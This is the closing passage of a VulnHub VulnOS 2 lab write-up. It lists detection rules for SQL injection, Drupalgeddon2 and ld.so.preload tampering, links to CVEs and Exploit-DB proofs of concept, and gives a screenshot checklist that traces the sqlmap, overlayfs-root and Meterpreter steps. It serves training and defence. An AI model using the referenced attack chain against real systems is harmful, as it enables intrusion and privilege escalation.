11. **Detection opportunities.**
    - Web WAF/log rule for `ajax_udf.php` with `UNION`/`SELECT`/`load_file`/`SLEEP(`
      in the query string.
    - Drupalgeddon2 signature: POSTs to `?q=user/password` or `?q=user/register`
      containing `#post_render`, `#lazy_builder` or `#markup`.
    - auditd on `/etc/ld.so.preload`:
      `-w /etc/ld.so.preload -p wa -k ldpreload`
    - Alert on `gcc`/`cc1` execution by a service account (`www-data`, `webmin`).
    - SSH: alert when a web application's DB user suddenly authenticates
      interactively.

---

## 9. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/vulnos-2,147/>
- Series: <https://vulnhub.com/series/vulnos,180/>
- Community writeups consulted:
  - [d4rc0d3x — Writeup of VulnOSv2 VM (OpenDocMan SQLi path)](https://github.com/d4rc0d3x/ctfs/tree/master/writeups/vulnhub/VulnOSv2)
  - [joenibe — Vulnhub VulnOS 2 Writeup (Drupalgeddon2 + overlayfs)](https://joenibe.github.io/vulnhub/vulnosv2/)
  - [xenjaya — VulnOS: 2 Walkthrough (PostgreSQL tunnelling path)](https://www.xenjaya.com/vulnos-2-walkthrough/)
  - [diesec — Writeup VulnOS: 2 (kill-chain summary)](https://diesec.home.blog/2020-03-15/writeup-vulnos-2/)
  - [arisarisyi — VulnOS v2 VulnHub Walkthrough](https://medium.com/@arisarisyi/vulnos-v2-vulnhub-walkthrough-2277e648e741)
  - [sms2thamb — Vulnhub: VulnOS 2 Walkthrough](https://medium.com/@sms2thamb/vulnhub-vulnos-2-e0f840f94b3f)
  - [3xocyte — VulnOS 2 Walkthrough (clean)](https://pastebin.com/TTLLK9A0)
  - [nagatodeptrai — VulnOS: 2](https://medium.com/@nagatodeptrai/vulnos-2-246c9450994e)
  - [erictee2012 — VulnOS 2 Writeup and Walkthrough](https://medium.com/@erictee2012/vulnos-2-writeup-and-walkthough-vulnhub-749973f4dc7)
  - [g0blin — VulnHub VulnOS 2 Solution Writeup](https://g0blin.co.uk/vulnos-2/)
- Exploits / advisories:
  - [CVE-2014-1945 — OpenDocMan 1.2.7 SQL Injection](https://nvd.nist.gov/vuln/detail/CVE-2014-1945) · [Exploit-DB 32075](https://www.exploit-db.com/exploits/32075) · [Exploit-DB 34993](https://www.exploit-db.com/exploits/34993)
  - [CVE-2018-7600 — Drupalgeddon2](https://nvd.nist.gov/vuln/detail/CVE-2018-7600) · [Drupal SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
  - [Exploit-DB 44449 / 44448 — Drupalgeddon2 PoCs](https://www.exploit-db.com/exploits/44449)
  - [CVE-2015-1328 — Ubuntu overlayfs LPE](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)
  - [Ubuntu USN-2641-1](https://ubuntu.com/security/notices/USN-2641-1)
  - [Rapid7 — drupal_drupalgeddon2 module](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)
- Background reading:
  - [sqlmap user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
  - [hashcat mode reference](https://hashcat.net/wiki/doku.php?id=example_hashes)
  - [OverlayFS kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt)
  - [Drupal render arrays and the Form API](https://www.drupal.org/docs/drupal-apis/render-api/render-arrays)
  - [GTFOBins](https://gtfobins.github.io) · [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

---

## 10. Screenshot checklist

- [ ] `images/01-opendocman.png` — the `/jabcd0cs/` OpenDocMan login (guest/guest)
- [ ] `images/02-sqlmap.png` — `sqlmap` dumping `odm_user`
- [ ] `images/03-ssh.png` — SSH login as `webmin` and the `uname -a` output
- [ ] `images/04-root.png` — overlayfs exploit → `uid=0(root)`
- [ ] `images/05-flag.png` — `/root/flag.txt`
- [ ] `images/06-drupal.png` — Drupalgeddon2 Meterpreter session (alternate path)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
